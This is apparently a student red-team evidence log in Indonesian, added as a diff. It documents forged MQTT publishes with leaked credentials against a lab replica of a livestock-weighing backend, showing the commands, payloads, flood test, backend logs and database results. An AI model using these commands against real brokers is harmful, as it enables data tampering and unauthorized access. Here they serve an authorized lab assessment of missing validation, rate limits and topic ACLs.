@@ -1,0 +1,125 @@
+BUKTI RED TEAM — Skenario 5: MQTT publish dengan kredensial bocor
+PBL TEK1314 Kelompok 4 — Fase 2, Skenario 5
+Tanggal eksekusi: 2026-10-28 (semua waktu UTC, format YYYY-MM-DD HH:MM:SS)
+Attacker Node : PBL-K4-02-Attacker-Kali (192.168.4.100) — perintah dijalankan di dalam VM Kali
+Target Node   : PBL-K4-01-Target-KABITA (192.168.4.5) — replika lab, BUKAN sistem KABITA milik Mitra
+Isi berkas ini = keluaran perintah yang benar-benar dijalankan (bukan tulisan tangan).
+==============================================================================
+
+Perintah sesuai panduan: mosquitto_pub -h 192.168.4.5 -p 1883 -u kabita_device -P <bocor> \
+                        -t kabita/readings -m '{"tag_rfid":"RFID-002","berat_kg":9999}'
+
+RANGKUMAN HASIL (penting — hasil berbeda dari yang diasumsikan panduan)
+  1) Payload 9999 kg: broker MENERIMA pesan (mosquitto_pub exit 0, tanpa error autentikasi),
+     TETAPI backend menolaknya: "mqtt: gagal proses reading dari tag RFID-002: invalid berat_kg".
+     Sebabnya: processReading sudah membatasi rentang 0 < berat_kg <= 300 (main.go baris 112),
+     jadi 9999 TIDAK pernah masuk bobot_log. Premis panduan ("hanya validasi tipe data") keliru.
+  2) Celah yang benar-benar terbukti — memasukkan nilai di DALAM rentang kode tapi tidak wajar:
+       299   kg  -> DITERIMA dan tersimpan di bobot_log (kambing_id 4)
+       0.1   kg  -> DITERIMA dan tersimpan
+     Tidak ada validasi kewajaran fisik maupun penandaan anomali (pencarian kata kunci
+     anomal/wajar/plausib di main.go = tidak ada).
+  3) 20 pesan terkirim dalam < 1 detik tanpa penolakan -> broker tidak punya rate limit.
+  4) Publish ke topic lain (kabita/readings/../sensor) tetap diterima (exit 0) -> tidak ada ACL
+     topic per-user; kredensial bocor bebas menulis ke topic mana pun.
+  Dampak terukur: bobot_log tag RFID-002 bertambah dari 1 baris menjadi 24 baris
+  (total tabel 13 -> 36 baris) dalam 4 detik, tanpa satu pun peringatan di sisi target.
+  Kredensial MQTT disensor di berkas ini; aslinya dibaca dari /opt/kabita-backend/.env (mode 600)
+  pada Target Node lewat SSH — itulah bentuk "credential theft" yang disimulasikan.
+
+------------------------------------------------------------------------------
+KELUARAN MENTAH
+------------------------------------------------------------------------------
+waktu target (UTC): 2026-10-28 06:45:11
+
+--- keadaan bobot_log SEBELUM serangan (tag RFID-002 / kambing_id 4) ---
+ id | tag_rfid | jumlah_log | berat_max 
+----+----------+------------+-----------
+  1 | KBT-001  |          7 |     19.70
+  2 | KBT-002  |          4 |     22.40
+  3 | KBT-003  |          1 |      9.80
+  4 | RFID-002 |          1 |     28.40
+(4 rows)
+
+
+--- total baris bobot_log sebelum ---
+13
+=== identitas penyerang ===
+waktu attacker (UTC): 2026-10-28 06:45:11
+kali
+
+=== kredensial yang dipakai (disensor di bukti) ===
+  user: kabita_device   password: ***kredensial-lab-disensor***   (didapat dari .env Target Node yang bocor)
+
+=== [5a] perintah PERSIS seperti panduan — payload berat_kg=9999 (di luar kewajaran fisik) ===
+$ mosquitto_pub -h 192.168.4.5 -p 1883 -u kabita_device -P <bocor> -t kabita/readings -m '{"tag_rfid":"RFID-002","berat_kg":9999}'
+[exit 0] (exit 0 + tanpa output = broker MENERIMA pesan; tidak ada error autentikasi)
+
+=== [5b] payload anomali lain yang masih di dalam rentang kode (0 < x <= 300) ===
+  publish {"tag_rfid":"RFID-002","berat_kg":299} -> exit=0 (diterima broker)
+  publish {"tag_rfid":"RFID-002","berat_kg":0.1} -> exit=0 (diterima broker)
+  publish {"tag_rfid":"RFID-002","berat_kg":21.5} -> exit=0 (diterima broker)
+
+=== [5c] publish ke topic liar untuk uji otorisasi topic ===
+[exit 0]
+
+=== [5d] publish massal (rate-limit broker?) — 20 pesan beruntun ===
+  20 pesan terkirim tanpa penolakan (mulai 06:45:15, selesai 06:45:15)
+
+waktu target (UTC): 2026-10-28 06:45:15
+
+--- log backend: pesan MQTT yang diproses sesudah serangan ---
+Oct 28 06:45:12 kabita kabita-backend[1296]: 2026/10/28 06:45:12 mqtt: gagal proses reading dari tag RFID-002: invalid berat_kg
+Oct 28 06:45:12 kabita kabita-backend[1296]: 2026/10/28 06:45:12 mqtt: reading tersimpan — tag RFID-002, 299.0 kg (kambing_id 4)
+Oct 28 06:45:13 kabita kabita-backend[1296]: 2026/10/28 06:45:13 mqtt: reading tersimpan — tag RFID-002, 0.1 kg (kambing_id 4)
+Oct 28 06:45:14 kabita kabita-backend[1296]: 2026/10/28 06:45:14 mqtt: reading tersimpan — tag RFID-002, 21.5 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 11.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 12.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 13.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 14.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 15.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 16.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 17.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 18.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 19.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 20.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 21.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 22.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 23.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 24.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 25.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 26.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 27.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 28.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 29.0 kg (kambing_id 4)
+Oct 28 06:45:15 kabita kabita-backend[1296]: 2026/10/28 06:45:15 mqtt: reading tersimpan — tag RFID-002, 30.0 kg (kambing_id 4)
+
+--- isi bobot_log tag RFID-002 (10 terbaru) ---
+ id | tag_rfid | berat_kg |        dicatat_pada        
+----+----------+----------+----------------------------
+ 36 | RFID-002 |    30.00 | 2026-10-28 06:45:15.568374
+ 35 | RFID-002 |    29.00 | 2026-10-28 06:45:15.550728
+ 34 | RFID-002 |    28.00 | 2026-10-28 06:45:15.534811
+ 33 | RFID-002 |    27.00 | 2026-10-28 06:45:15.518293
+ 32 | RFID-002 |    26.00 | 2026-10-28 06:45:15.499343
+ 31 | RFID-002 |    25.00 | 2026-10-28 06:45:15.48371
+ 30 | RFID-002 |    24.00 | 2026-10-28 06:45:15.460717
+ 29 | RFID-002 |    23.00 | 2026-10-28 06:45:15.444253
+ 28 | RFID-002 |    22.00 | 2026-10-28 06:45:15.417582
+ 27 | RFID-002 |    21.00 | 2026-10-28 06:45:15.393596
+(10 rows)
+
+--- total baris bobot_log sesudah ---
+36
+
+--- validasi yang ADA di kode (processReading) ---
+108:func processReading(in Reading) (int, error) {
+109-	if !tagRFIDPattern.MatchString(in.TagRFID) {
+110-		return 0, fmt.Errorf("invalid tag_rfid format")
+111-	}
+112-	if in.BeratKg <= 0 || in.BeratKg > 300 {
+113-		return 0, fmt.Errorf("invalid berat_kg")
+114-	}
+
+--- apakah ada mekanisme rentang nilai wajar / penandaan anomali? (pencarian di kode) ---
+292:		// Butuh rentang minimal (0,25 hari) supaya laju tidak meledak jadi angka tak wajar
